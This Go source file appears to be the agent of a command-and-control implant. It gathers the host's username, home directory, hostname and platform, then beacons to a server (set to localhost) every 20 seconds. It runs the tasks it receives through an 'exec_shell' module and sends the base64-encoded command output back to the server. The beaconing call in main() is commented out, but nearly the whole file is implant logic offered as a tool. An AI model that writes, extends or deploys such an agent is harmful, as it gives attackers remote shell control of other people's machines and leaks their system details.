package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"runtime"
	"time"

	Modules "./modules"
	Networking "./networking"
)

type Configuration struct {
	BaseUrl string
}

type Result struct {
	Command  string `json:"command"`
	Beaconid string `json:"beacon_id"`
	Type     string `json:"type"`
	Input    string `json:"input"`
	Taskid   string `json:"task_id"`
	Output   string `json:"output"`
}

type Command struct {
	Type  string `json:"type"`
	Name  string `json:"name"`
	Input string `json:"input"`
	Sleep int    `json:"sleep"`
}

// Define Base URL
var base_url = "http://localhost:5000/api/v1/ping"

// Get details from userspace
var user_object, user_error = user.Current()
var beacon_username = user_object.Username
var beacon_directory = user_object.HomeDir

// Get basic OS info (platform, hostname etc)
var beacon_hostname, hostname_error = os.Hostname()
var beacon_platform = runtime.GOOS
var beacon_id = ""

// Default timeout for beacon
var beacon_timer int = 20
var exit_process = false

// Map variable functions to map, used to call function by string-based variable
var function_mapping = map[string]func(string) string{
	"exec_shell": Modules.ExecShell,
}

func main() {
	// Generate global beacon_id and start beaconin process (same thread)
	beacon_id = Modules.GenerateID(beacon_username)
	fmt.Println(base_url)
	// StartBeacon()
}

func StartBeacon() {
	// Run beaconing process and spawn threads after execution
	// Sleep for X seconds defined by timer
	for exit_process == false {
		go StartPulse()
		time.Sleep(time.Duration(beacon_timer) * time.Second)
	}
}

func StartPulse() {
	// Send pulse and start threads to execute tasks
	pulse_result := Networking.SendPulse(BeaconData(), base_url)
	task_list := pulse_result.([]interface{})
	for _, task := range task_list {
		task_mapping := task.(map[string]interface{})
		task_id := task_mapping["_id"].(map[string]interface{})
		task_iod := task_id["$oid"].(string)
		commands := task_mapping["commands"].([]interface{})
		go ExecuteTasks(task_iod, commands)
	}

}

func BeaconData() []byte {
	// Create default mapping of core agent data
	base_content := map[string]interface{}{"beacon_id": beacon_id, "working_dir": beacon_directory,
		"username": beacon_username, "hostname": beacon_hostname, "platform": beacon_platform,
		"timer": beacon_timer, "data": map[string]string{}}
	json_content, _ := json.Marshal(base_content)
	return json_content
}

func ExecuteTasks(task_iod string, commands []interface{}) {
	// Execute tasks in ordered list / synchronous
	for _, commands := range commands {
		command_mapping := commands.(map[string]interface{})
		cmd_sleep := command_mapping["sleep"].(float64)
		cmd_name := command_mapping["name"].(string)
		cmd_input := command_mapping["input"].(string)
		cmd_output := function_mapping[cmd_name](cmd_input)

		result := &Result{
			Taskid:   task_iod,
			Type:     "manual",
			Beaconid: beacon_id,
			Command:  cmd_name,
			Input:    cmd_input,
			Output:   base64.StdEncoding.EncodeToString([]byte(cmd_output)),
		}

		time.Sleep(time.Duration(cmd_sleep) * time.Second)
		json_object, _ := json.Marshal(result)
		Networking.SendResult(base_url, json_object)

	}
}
